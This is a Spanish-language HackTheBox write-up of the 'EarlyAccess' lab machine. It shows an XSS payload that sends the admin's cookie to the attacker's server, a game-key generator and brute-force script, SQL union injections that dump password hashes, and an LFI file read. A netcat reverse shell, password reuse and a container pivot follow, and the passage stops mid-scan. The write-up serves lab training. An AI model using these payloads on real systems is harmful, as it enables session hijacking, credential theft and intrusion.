---
layout: post
title: EarlyAccess - WriteUp
author: WildZarek
permalink: /htb/earlyaccess
excerpt: "Máquina Linux de dificultad alta, con mucha enumeración, distintas técnicas y vulnerabilidades que tocar. Nos aprovecharemos de XSS, SQLI, Cookie Hijacking, entre otras. Realizaremos pivoting de usuarios gracias a la reutilización de contraseñas y pivoting de contenedores Docker enumerando con Nmap y utilizando Port-Forwarding (Chisel)."
description: "Máquina Linux de dificultad alta, con mucha enumeración, distintas técnicas y vulnerabilidades que tocar. Nos aprovecharemos de XSS, SQLI, Cookie Hijacking, entre otras. Realizaremos pivoting de usuarios gracias a la reutilización de contraseñas y pivoting de contenedores Docker enumerando con Nmap y utilizando Port-Forwarding (Chisel)."
date: 2022-02-13
header:
  teaser: /assets/images/hackthebox/machines/earlyaccess.png
  teaser_home_page: true
  icon: /assets/images/hackthebox/htb_icon_original.png
categories: [HackTheBox, Pentesting, Web Exploiting, Pivoting, Port Forwarding, Privilege Escalation]
tags: [WEAK PASSWORD, SOURCE CODE REVIEW, PASSWORD REUSE, API, DOCKER, RCE, LFI, SUID, SQLI, COOKIE HIJACKING, XSS]
---

<p align="center"><img src="/assets/images/hackthebox/machines/earlyaccess.png"></p>

Saludos pentesters, en esta ocasión volvemos a la carga con una máquina Linux recién retirada, de dificultad Hard en la que tocamos muchos conceptos y técnicas. 

## Fecha de Resolución

<p align="center"><a href="https://www.hackthebox.com/achievement/machine/18979/375"><img src="/assets/images/hackthebox/machines/earlyaccess/pwned_date.png"></a></p>

## Fase de Reconocimiento

Empezamos con el reconocimiento de puertos lanzando un **`TCP SYN Port Scan`**

| Parámetro | Descripción |
| :-------- | :---------- |
| -p-       | Escanea el rango completo de puertos (hasta el 65535)    |
| -sS       | Realiza un escaneo de tipo SYN port scan                 |
| --min-rate | Enviar paquetes no más lentos que 5000 por segundo      |
| --open    | Mostrar sólo los puertos que esten abiertos              |
| -vvv      | Triple verbose para ver en consola los resultados        |
| -n        | No efectuar resolución DNS                               |
| -Pn       | No efectuar descubrimiento de hosts                      |
| -oG       | Guarda el output en un archivo con formato grepeable para usar la función [extractPorts](https://pastebin.com/tYpwpauW) de [S4vitar](https://s4vitar.github.io/)

```console
p3ntest1ng:~$ sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.110 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-04 00:13 CET
Initiating SYN Stealth Scan at 00:13
Scanning 10.10.11.110 [65535 ports]
Discovered open port 443/tcp on 10.10.11.110
Discovered open port 22/tcp on 10.10.11.110
Discovered open port 80/tcp on 10.10.11.110
Completed SYN Stealth Scan at 00:14, 12.49s elapsed (65535 total ports)
Nmap scan report for 10.10.11.110
Host is up, received user-set (0.12s latency).
Scanned at 2022-02-04 00:13:59 CET for 12s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 62
443/tcp open  https   syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.88 seconds
           Raw packets sent: 65608 (2.887MB) | Rcvd: 65563 (2.623MB)
```

Identificamos estos puertos abiertos:

| Puerto | Descripción |
| :----- | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)** - SSH o Secure Shell |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Servidor_web)** - Servidor web |
| 443    | **[HTTPS](https://es.wikipedia.org/wiki/Protocolo_seguro_de_transferencia_de_hipertexto)** - Protocolo seguro de transferencia de hipertexto |

Vamos a obtener más información con un escaneo específico sobre los puertos que hemos encontrado.

| Parámetro | Descripción |
| :-------- | :---------- |
| -p        | Escanea sobre los puertos especificados                |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Determina la versión del servicio                      |
| -oN       | Guarda el output en un archivo con formato normal      |

```console
p3ntest1ng:~$ nmap -sCV -p 22,80,443 10.10.11.110 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-04 00:15 CET
Nmap scan report for 10.10.11.110
Host is up (0.066s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)
|   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)
|_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)
80/tcp  open  http     Apache httpd 2.4.38
|_http-title: Did not follow redirect to https://earlyaccess.htb/
|_http-server-header: Apache/2.4.38 (Debian)
443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
|_http-title: EarlyAccess
| ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
| Not valid before: 2021-08-18T14:46:57
|_Not valid after:  2022-08-18T14:46:57
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.38 (Debian)
| tls-alpn: 
|_  http/1.1
Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.00 seconds
```

Lo primero que vemos es que nos está haciendo un redirect hacia el virtualhost **`https://earlyaccess.htb/`**, vamos a añadirlo a nuestro **`/etc/hosts`**

```console
p3ntest1ng:~$ echo '10.10.11.110 earlyaccess.htb' | sudo tee -a /etc/hosts
```

Comprobemos con qué se ha construido esta página web con ayuda de **`whatweb`**

```console
p3ntest1ng:~$ whatweb https://earlyaccess.htb/
https://earlyaccess.htb/ [200 OK] Apache[2.4.38], Bootstrap, Cookies[XSRF-TOKEN,earlyaccess_session], Country[RESERVED][ZZ], Email[admin@earlyaccess.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.11.110], PHP[7.4.21], Script, Title[EarlyAccess], X-Powered-By[PHP/7.4.21]
```

Podemos ver si existen subdominios con wfuzz, en este caso me estoy saltando el fuzz de directorios porque no encontré nada interesante.

| Parámetro  | Descripción |
| :--------- | :---------- |
| -c         | Mostrar el output en formato colorizado |
| -w         | Utiliza el diccionario especificado |
| --hw 28,53 | Oculta los resultados con 28 y 53 palabras para evitar falsos positivos |
| -H         | Realiza una consulta de tipo header |
| -u         | Especifica la URL para la consulta |
| -t         | Nos permite lanzar el comando con N threads |

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hw 28,53 -H "Host: FUZZ.earlyaccess.htb" -u http://earlyaccess.htb/ -t 50 2>/dev/null

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://earlyaccess.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000019:   200        55 L     129 W      2685 Ch     "dev"                                                                                                                       
000000194:   200        55 L     136 W      2709 Ch     "game"                                                                                                                      

Total time: 0
Processed Requests: 114441
Filtered Requests: 114439
Requests/sec.: 0
```

Añadimos los subdominios **`dev.earlyaccess.htb`** y **`game.earlyaccess.htb`** a nuestro archivo **`/etc/hosts`** para poder acceder posteriormente.
Primero vamos a ver qué tenemos en la página principal:

![Website](/assets/images/hackthebox/machines/earlyaccess/website.png)

En este punto podemos registrar una cuenta nueva para poder analizar la página.

![Registration](/assets/images/hackthebox/machines/earlyaccess/registration.png)

![Welcome](/assets/images/hackthebox/machines/earlyaccess/welcome.png)

## Fase de Explotación

Lo primero que me llama la atención es el apartado **`Register key`**, en el cual puedes registrar una clave del juego. Luego veremos esto en más detalle.

![GameKey](/assets/images/hackthebox/machines/earlyaccess/addkey.png)

De momento volvamos a fijarnos en el apartado **`Messaging`**, vemos que tenemos un formulario de contacto en **`Contact Us`**:

![ContactUs](/assets/images/hackthebox/machines/earlyaccess/contactus.png)

Podemos probar [XSS Injection](https://owasp.org/www-community/attacks/xss/) aprovechando este apartado para tratar de secuestrar la cookie de sesión del administrador.
Para ello primero necesitamos levantar un servidor HTTPS en nuestra máquina, esto podemos hacerlo con Python3.
Os dejo el script [https_server.py](https://github.com/WildZarek/wildzarek.github.io/blob/master/scripts/python/https_server.py) para que podáis utilizarlo, pero primero tenemos que crear un certificado SSL.

```console
p3ntest1ng:~$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

Esto nos pedirá una serie de datos, simplemente le damos a la tecla Enter hasta finalizar.
Y ahora ya podemos levantar el servidor https con nuestro script:

```console
p3ntest1ng:~$ python3 https_server.py 10.10.16.29 4443
Serving HTTPS on 10.10.16.29 port 4443 (https://10.10.16.29:4443/) ...
```

Teniendo esto listo, nos vamos a nuestro perfil en https://earlyaccess.htb/user/profile y cambiamos nuestro nombre,
debido a que el campo **`Name`** es vulnerable a XSS y será el que lea el administrador cuando le escribamos un mensaje desde el formulario de contacto:

![XSS](/assets/images/hackthebox/machines/earlyaccess/xss1.png)

El payload que estaremos utilizando es el siguiente:
{% raw %}
~~~html
<script>var i=new Image; i.src="https://10.10.16.29:4443/?"+document.cookie;</script>
~~~
{% endraw %}

![XSS](/assets/images/hackthebox/machines/earlyaccess/xss2.png)

Guardamos los cambios y probamos a enviarle un mensaje al administrador. Tardará un rato en procesar nuestro mensaje una vez enviado, por lo que esperamos un par de minutos...

Si todo ha ido bien, en nuestro servidor https deberemos ver la petición con la cookie del administrador:

```console
p3ntest1ng:~$ python3 https_server.py 10.10.16.29 4443
Serving HTTPS on 10.10.16.29 port 4443 (https://10.10.16.29:4443/) ...
10.10.11.110 - - [12/Feb/2022 17:57:52] "GET /?XSRF-TOKEN=eyJpdiI6InRHUVkzSEg5SEtnenJYNnZYVysyRWc9PSIsInZhbHVlIjoiZFBnenRQVS9GVXhETFdCOFpHUmZRTGJ2bkUzK2loeWxhbXMwSiswWE5RZWRTSzErVmhQM3NrazhobjU0cTFQSU9DZjdoMkYyMURJRmpHdGV0Q0NnTzNuRmJXU08zQlBjWGxvdjhQQXRVRjBXTGFwZlJHQjNaU0lPZ1RKeEJhNXAiLCJtYWMiOiI2OTNkNWU3MGNkNGY3OTkxZTFmOWZhNmQ5NmEzYWRiNzVmZDI1ZDg2OTBjYTQ0YzdkOTJmNzJmYzBjMjE2NjNjIn0%3D;%20earlyaccess_session=eyJpdiI6ImNYejdtbFZuWlo5UmZrd0JoN2RYY1E9PSIsInZhbHVlIjoiaHgxWTg1bUdBSWF5eHorK3VkSldUTGoxYVNtdHV2NTlkS1I3cTFZL0xzRVBHbHczZHIwU3NEMUY0Z3VqUlE0djJHaUlxZmNwN2d1UERZeVVOOThtVWUxVFcrcXlCSU5XOGlpUENmOGEzc2doa1ZncUQxUEw4MmlHdHErQ2h2S3kiLCJtYWMiOiJmNzlmZTc1ZmY5MjllYzk3ZTU0NmI3MDUzOTJmMjU3NzcxZTA4NzEyZjNjMjJjNmYyNGIxNTk2OGFiYjFmOTY5In0%3D HTTP/1.1" 200 -
```

De esta cookie debemos tener en cuenta que el servidor nos genera dos diferentes, una llamada **`XSRF-TOKEN`** y otra **`earlyaccess_session`**,
por lo que hay que tener cuidado y separarlas correctamente para poder utilizarlas en el navegador.

> XSRF-TOKEN=eyJpdiI6InRHUVkzSEg5SEtnenJYNnZYVysyRWc9PSIsInZhbHVlIjoiZFBnenRQVS9GVXhETFdCOFpHUmZRTGJ2bkUzK2loeWxhbXMwSiswWE5RZWRTSzErVmhQM3NrazhobjU0cTFQSU9DZjdoMkYyMURJRmpHdGV0Q0NnTzNuRmJXU08zQlBjWGxvdjhQQXRVRjBXTGFwZlJHQjNaU0lPZ1RKeEJhNXAiLCJtYWMiOiI2OTNkNWU3MGNkNGY3OTkxZTFmOWZhNmQ5NmEzYWRiNzVmZDI1ZDg2OTBjYTQ0YzdkOTJmNzJmYzBjMjE2NjNjIn0%3D;%20
> earlyaccess_session=eyJpdiI6ImNYejdtbFZuWlo5UmZrd0JoN2RYY1E9PSIsInZhbHVlIjoiaHgxWTg1bUdBSWF5eHorK3VkSldUTGoxYVNtdHV2NTlkS1I3cTFZL0xzRVBHbHczZHIwU3NEMUY0Z3VqUlE0djJHaUlxZmNwN2d1UERZeVVOOThtVWUxVFcrcXlCSU5XOGlpUENmOGEzc2doa1ZncUQxUEw4MmlHdHErQ2h2S3kiLCJtYWMiOiJmNzlmZTc1ZmY5MjllYzk3ZTU0NmI3MDUzOTJmMjU3NzcxZTA4NzEyZjNjMjJjNmYyNGIxNTk2OGFiYjFmOTY5In0%3D

Gracias al inspector del navegador podemos modificar fácilmente las cookies y secuestrar la sesión del administrador:

![Cookie](/assets/images/hackthebox/machines/earlyaccess/cookie.png)

Una vez cambiadas le damos a refrescar la página con la tecla F5 (no hagas click en el símbolo de refrescar al lado de las cookies porque eso volverá a establecer tus cookies, no la del administrador).

![Admin](/assets/images/hackthebox/machines/earlyaccess/admin1.png)

Vemos que el menú ha cambiado y ahora tenemos acceso a funciones administrativas, echemos un vistazo.

![Admin](/assets/images/hackthebox/machines/earlyaccess/admin2.png)

Aquí tenemos disponible para descargar un script escrito en Python, que podemos utilizar para validar claves del juego,
según explica el administrador, esto lo ha puesto para cuando la API no responda, que el resto de administradores puedan validar las claves de los usuarios.
Podemos validar las claves en el siguiente enlace **https://earlyaccess.htb/key** o bien con este script.

Necesitamos un keygen para obtener claves válidas, podríamos analizar el script **`validate.py`** que nos hemos descargado previamente,
y crear uno nosotros, en este caso yo lo que hice fue utilizar uno que ya había escrito otra persona:

```python
import random
from re import match

ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
ALPHABET1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
NUM = "0123456789"
min = 178
for x in ALPHABET1:
    for y in ALPHABET1:
        for z in NUM:
            res = int(ord(x))+int(ord(y))+int(ord(z))
            if res >= min:
                group = "XP"+x+y+z
                gs = ['KEY84', '0F1O4']
                gs.append(group)
                gs.append('GAMM4')
                lastgrp = sum([sum(bytearray(g.encode())) for g in gs])
                print("KEY84-0F1O4-"+group+"-GAMM4-0"+str(lastgrp))
                min = min+1
```

Este script genera 60 claves que vamos a guardar en un documento llamado **`keys.txt`**. Ahora necesitamos aplicar fuerza bruta sobre estas claves para ver cuál es válida.
Os comparto el script (no es mío) para realizar esta tarea:

```python
import requests
import re

requests.packages.urllib3.disable_warnings()

# just for bruteforcing key-gens from the api!
# just grab valid XSRF-TOKEN for send_request() function to work!
# just for bruteforcing key-gens from the api!

s = requests.Session()

cookies = {
    'XSRF-TOKEN': 'eyJpdiI6InRHUVkzSEg5SEtnenJYNnZYVysyRWc9PSIsInZhbHVlIjoiZFBnenRQVS9GVXhETFdCOFpHUmZRTGJ2bkUzK2loeWxhbXMwSiswWE5RZWRTSzErVmhQM3NrazhobjU0cTFQSU9DZjdoMkYyMURJRmpHdGV0Q0NnTzNuRmJXU08zQlBjWGxvdjhQQXRVRjBXTGFwZlJHQjNaU0lPZ1RKeEJhNXAiLCJtYWMiOiI2OTNkNWU3MGNkNGY3OTkxZTFmOWZhNmQ5NmEzYWRiNzVmZDI1ZDg2OTBjYTQ0YzdkOTJmNzJmYzBjMjE2NjNjIn0%3D;%20',
    'earlyaccess_session': 'eyJpdiI6ImNYejdtbFZuWlo5UmZrd0JoN2RYY1E9PSIsInZhbHVlIjoiaHgxWTg1bUdBSWF5eHorK3VkSldUTGoxYVNtdHV2NTlkS1I3cTFZL0xzRVBHbHczZHIwU3NEMUY0Z3VqUlE0djJHaUlxZmNwN2d1UERZeVVOOThtVWUxVFcrcXlCSU5XOGlpUENmOGEzc2doa1ZncUQxUEw4MmlHdHErQ2h2S3kiLCJtYWMiOiJmNzlmZTc1ZmY5MjllYzk3ZTU0NmI3MDUzOTJmMjU3NzcxZTA4NzEyZjNjMjJjNmYyNGIxNTk2OGFiYjFmOTY5In0%3D'
}

r = s.get('https://earlyaccess.htb/key', verify=False, cookies=cookies)

token = re.search('value="(.*?)">', r.text).group(1)

with open('keys.txt', 'r') as f:
    keys = f.readlines()
    keys = list(keys)
    for i in range(len(keys)):
        data = {'_token': token, 'key': keys[i].replace('\n', '')}
        r = s.post('https://earlyaccess.htb/key/verify', cookies=cookies, verify=False, data=data)
        if 'Game-key is invalid! DEBUG: Key is invalid!' not in r.text:
            print(f'Your key is {keys[i]}')
            break
```

Ejecutando el script, nos devuelve una clave válida de entre las 60 generadas. En mi caso es:

```console
p3ntest1ng:~$ python3 bruteforce_keys.py
Your key is KEY84-0F1O4-XPCZ9-GAMM4-01363
```

Verificamos en la página **https://earlyaccess.htb/key** y nos dice que es válida.

![Valid Key](/assets/images/hackthebox/machines/earlyaccess/validkey.png)

Podemos visitar **`game.earlyaccess.htb`** con nuestra clave validada e introducirla, pero primero tenemos que iniciar sesión con el usuario que creamos al principio
y registrar la clave generada para que se asocie a nuestra cuenta.

![Game Domain](/assets/images/hackthebox/machines/earlyaccess/gamedomain.png)

> NOTA: Si nos da error de usuario no válido, es posible que haya caducado la sesión, en este caso tendremos que registrar una nueva cuenta.

![Register Key](/assets/images/hackthebox/machines/earlyaccess/regkey.png)

Ya que tenemos la clave registrada en nuestra cuenta, nos dirigimos al apartado **`Game`** que nos ha aparecido en el menú.

![Game](/assets/images/hackthebox/machines/earlyaccess/game.png)

Aquí vemos el típico juego de la serpiente, pero no parece estar funcional porque a mí no me deja moverme en el juego. Revisemos las opciones del menú superior.

![Scoreboard](/assets/images/hackthebox/machines/earlyaccess/scoreboard.png)

![Leaderboard](/assets/images/hackthebox/machines/earlyaccess/leaderboard.png)

Podemos tratar de provocar un **`SQLI`** como hicimos anteriormente con XSS, esta vez modificaremos nuestro nombre de perfil para introducir una comilla simple.

![SQLI Test](/assets/images/hackthebox/machines/earlyaccess/sqlitest.png)

Si recargamos la página del juego vemos que ahora se ha producido un error, confirmando que es vulnerable a SQLI.

![SQL Error](/assets/images/hackthebox/machines/earlyaccess/sqlerror.png)

Cambiemos nuestro nombre de usuario de nuevo para incluir una consulta SQL más específica:
> ') union select 1,2,user()-- -

![SQLI](/assets/images/hackthebox/machines/earlyaccess/sqli1.png)

Recargamos la página del Scoreboard...

![SQLI](/assets/images/hackthebox/machines/earlyaccess/sqli2.png)

Vemos que existe un usuario de nombre **`game`**, anotemos este dato para más adelante por si nos fuera de utilidad.
Ahora vamos a modificar de nuevo nuestro nombre para realizar una consulta completa y listar todos los usuarios y sus contraseñas:
> ') union select 1,2,concat(name,':',password) FROM users-- -

![SQLI](/assets/images/hackthebox/machines/earlyaccess/sqli3.png)

Recargamos nuevamente el Scoreboard...

![SQLI](/assets/images/hackthebox/machines/earlyaccess/sqli4.png)

Tenemos los hashes de los usuarios, en este caso vemos dos diferentes para el usuario **`admin`**. Utilizo **`crackstation.net`** para tratar de romper estos hashes:

![Cracked Passwords](/assets/images/hackthebox/machines/earlyaccess/crackedpass.png)

Con estas credenciales podemos iniciar sesión como el administrador y echarle un ojo a **`dev.earlyaccess.htb`**
> NOTA: Si no carga bien el recurso, es posible que haya quedado cacheado en el navegador, prueba con Ctrl+F5 o limpia la caché.

![Dev](/assets/images/hackthebox/machines/earlyaccess/dev.png)

Apliquemos un poco de fuzzing sobre este subdominio para ver si encontramos algo interesante:

| Parámetro | Descripción |
| :-------- | :---------- |
| -c        | Muestra el output en formato colorizado |
| -w        | Utiliza el diccionario especificado |
| --hc 404  | Oculta todos los códigos de estado 404 |

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://dev.earlyaccess.htb/FUZZ 2>/dev/null

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.earlyaccess.htb/FUZZ
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000001:   200        55 L     129 W      2685 Ch     "http://dev.earlyaccess.htb/"                                                                                               
000000013:   403        9 L      28 W       284 Ch      ".htpasswd"                                                                                                                 
000000011:   403        9 L      28 W       284 Ch      ".hta"                                                                                                                      
000000012:   403        9 L      28 W       284 Ch      ".htaccess"                                                                                                                 
000000259:   301        9 L      28 W       328 Ch      "actions"                                                                                                                   
000000499:   301        9 L      28 W       327 Ch      "assets"                                                                                                                    
000002021:   200        55 L     129 W      2685 Ch     "index.php"                                                                                                                 
000002013:   301        9 L      28 W       329 Ch      "includes"                                                                                                                  
000003588:   403        9 L      28 W       284 Ch      "server-status"                                                                                                             

Total time: 0
Processed Requests: 4614
Filtered Requests: 4605
Requests/sec.: 0
```

Vemos que existe un directorio **`actions`** y archivo **`index.php`**, por lo que vamos a buscar más archivos de este tipo dentro de dicho directorio.

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 --hw 28 http://dev.earlyaccess.htb/actions/FUZZ.php -t 75 2>/dev/null

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.earlyaccess.htb/actions/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000053:   302        0 L      0 W        0 Ch        "login"                                                                                                                     
000000759:   500        0 L      3 W        35 Ch       "file"                                                                                                                      
000001225:   302        0 L      0 W        0 Ch        "logout"                                                                                                                    
000010114:   302        0 L      0 W        0 Ch        "hash"                                                                                                                      
000132873:   404  ^C
Total time: 1502.091
Processed Requests: 132852
Filtered Requests: 132848
Requests/sec.: 88.44467
```

Hemos encontrado 4 archivos, de los cuales me llaman la atención **`file.php`** y **`hash.php`**, veamos qué contienen.

![HashingTools](/assets/images/hackthebox/machines/earlyaccess/hashtools.png)

![FileTools](/assets/images/hackthebox/machines/earlyaccess/filetools.png)

![LFI](/assets/images/hackthebox/machines/earlyaccess/lfi1.png)

Aquí se empieza a tensar la cosa, porque por lo visto **`file.php`** es vulnerable a [Local File Inclusion (LFI)](https://ironhackers.es/herramientas/lfi-cheat-sheet/).
Vamos a fuzzear de nuevo este archivo en busca de parámetros que puedan ser vulnerables:

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hh 35 -u 'http://dev.earlyaccess.htb/actions/file.php?FUZZ=/etc/passwd' 2>/dev/null

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.earlyaccess.htb/actions/file.php?FUZZ=/etc/passwd
Total requests: 2588

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000001316:   500        0 L      10 W       89 Ch       "filepath"                                                                                                                  

Total time: 50.21962
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 51.53364
```

Sabiendo esto, podemos obtener cualquier archivo del sistema, para ello vamos a utilizar este filtro PHP para convertir el output a Base64:
> http://dev.earlyaccess.htb/actions/file.php?filepath=php://filter/convert.base64-encode/resource=/var/www/earlyaccess.htb/dev/actions/hash.php

De este modo podemos copiar el resultado para luego decodificarlo y así obtener el codigo php del archivo hash.

![LFI](/assets/images/hackthebox/machines/earlyaccess/lfi2.png)

![Decode](/assets/images/hackthebox/machines/earlyaccess/decode.png)

Analizamos el código php y vemos que el archivo utiliza **`hash_function`** como variable para el tipo de hash a utilizar,
también se utiliza **`password`** como variable para el valor a codificar. Todas las variables son tomadas con **`$_REQUEST`**.
Si capturamos la petición con **`BurpSuite`** podemos ver cada uno de los parámetros que se utilizan en la consulta POST.
Con esta información podemos crear un script en python que nos automatice la conexión de una shell inversa a nuestra máquina.

Os dejo el script [revsh_earlyaccess.py](https://github.com/WildZarek/wildzarek.github.io/blob/master/scripts/python/revsh_earlyaccess.py) para que lo descarguéis en vuestra máquina. Una vez lo tenemos, nos ponemos en escucha con netcat y lo ejecutamos en otra terminal:

```console
p3ntest1ng:~$ nc -nlvp 9999
listening on [any] 9999 ...
```

```console
p3ntest1ng:~$ python3 revsh_earlyaccess.py 10.10.16.29 9999
```

```console
p3ntest1ng:~$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.16.29] from (UNKNOWN) [10.10.11.110] 55606
whoami && id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ahora tenemos que realizar un tratamiento a la tty para poder movernos por la shell con mayor comodidad.

```console
script /dev/null -c bash
Script started, file is /dev/null
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ^Z
zsh: suspended  nc -nlvp 9999
p3ntest1ng:~$ stty raw -echo; fg
[1]  + continued  nc -nlvp 9999
                               reset xterm
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ export TERM=xterm
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ export SHELL=bash
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ stty rows 43 columns 189
```

Si ahora hacemos **`ls -la`** vemos los archivos php, entre ellos el **`hash.php`** que copiamos antes.
Vamos a listar los usuarios disponibles en el sistema:

```console
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
root
sync
www-adm
```

Podemos intentar pivotar al usuario **`www-adm`** utilizando la misma contraseña que tenía **`admin`**

```console
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ su www-adm
Password: gameover
www-adm@webserver:/var/www/earlyaccess.htb/dev/actions$ whoami
www-adm
```

Ahora comprobamos en qué hostname nos encontramos, y para desgracia nuestra, vemos que estamos en un contenedor **`Docker`**.

```console
www-adm@webserver:/var/www/earlyaccess.htb/dev/actions$ hostname -I
172.18.0.102
```

Tenemos que escapar del contenedor, pero para ello necesitamos enumerar un poco más el sistema para encontrar información útil.
Si retrocedemos dos directorios hacia atrás, vemos los directorios **`dev`** y **`game`**, y dentro de estos un directorio **`includes`**
donde se encuentra el archivo **`config.php`** con credenciales de acceso a la base de datos.

```console
www-adm@webserver:/var/www/earlyaccess.htb/dev/actions$ cd ../..
www-adm@webserver:/var/www/earlyaccess.htb$ ls
dev  game
www-adm@webserver:/var/www/earlyaccess.htb$ cd dev
www-adm@webserver:/var/www/earlyaccess.htb/dev$ ls
actions  assets  hashing.php  home.php  includes  index.php
www-adm@webserver:/var/www/earlyaccess.htb/dev$ cd includes
www-adm@webserver:/var/www/earlyaccess.htb/dev/includes$ ls
ban.php  config.php  error.php  header.php  menu.php  session.php
www-adm@webserver:/var/www/earlyaccess.htb/dev/includes$ cat config.php
...[snip]...
$host = "mysql";
$db = "db";
$user = "dev";
$password = "dev";
...[snip]...
ww-adm@webserver:/var/www/earlyaccess.htb/dev/includes$ cd ../../game/includes
www-adm@webserver:/var/www/earlyaccess.htb/game/includes$ ls
ban.php  config.php  error.php  header.php  menu.php  session.php
www-adm@webserver:/var/www/earlyaccess.htb/game/includes$ cat config.php
...[snip]...
$host = "mysql";
$db = "db";
$user = "game";
$password = "game";
...[snip]...
```

De momento esto no nos sirve de mucho así que vamos a descargar en nuestra máquina una copia del binario estático de nmap del siguiente repositorio:
> https://github.com/andrew-d/static-binaries/

```console
p3ntest1ng:~$ mkdir /tmp/wildzarek
p3ntest1ng:~$ cd !$
cd /tmp/wildzarek
p3ntest1ng:~$ wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
```

Tenemos que subir este binario a la máquina EarlyAccess levantando un servidor http con python3 en nuestra máquina:

```console
p3ntest1ng:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```console
www-adm@webserver:/var/www/earlyaccess.htb/game/includes$ mkdir /tmp/wildzarek
www-adm@webserver:/var/www/earlyaccess.htb/game/includes$ cd !$
cd /tmp/wildzarek
www-adm@webserver:/tmp/wildzarek$ wget http://10.10.16.29/nmap
--2022-02-13 00:58:35--  http://10.10.16.29/nmap
Connecting to 10.10.16.29:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5944464 (5.7M) [application/octet-stream]
Saving to: 'nmap'

nmap    100%[=====================================>]   5.67M  1.61MB/s    in 3.5s

2022-02-13 00:58:39 (1.61 MB/s) - 'nmap' saved [5944464/5944464]

www-adm@webserver:/tmp/wildzarek$ ls
nmap
www-adm@webserver:/tmp/wildzarek$ chmod +x nmap
```

Con esto ya podemos empezar a enumerar la máquina y tratar de encontrar un modo de escapar del contenedor. Recordemos que estamos en **`172.18.0.102`**

```console
www-adm@webserver:/tmp/wildzarek$ ./nmap -sn -sV 172.18.0.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-02-13 01:03 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.1
Host is up (0.00064s latency).
Nmap scan report for admin-simulation.app_nw (172.18.0.2)
Host is up (0.00050s latency).
Nmap scan report for mysql.app_nw (172.18.0.100)
Host is up (0.00031s latency).
Nmap scan report for api.app_nw (172.18.0.101)
Host is up (0.00020s latency).
Nmap scan report for webserver (172.18.0.102)
Host is up (0.00015s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 15.51 seconds
```

Veamos si tenemos puertos abiertos en la máquina **`api.app_nw`** y luego vamos probando en otras.

```console
www-adm@webserver:/tmp/wildzarek$ ./nmap -p- -sT 172.18.0.101

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-02-13 01:07 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for api.app_nw (172.18.0.101)
Host is up (0.00019s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
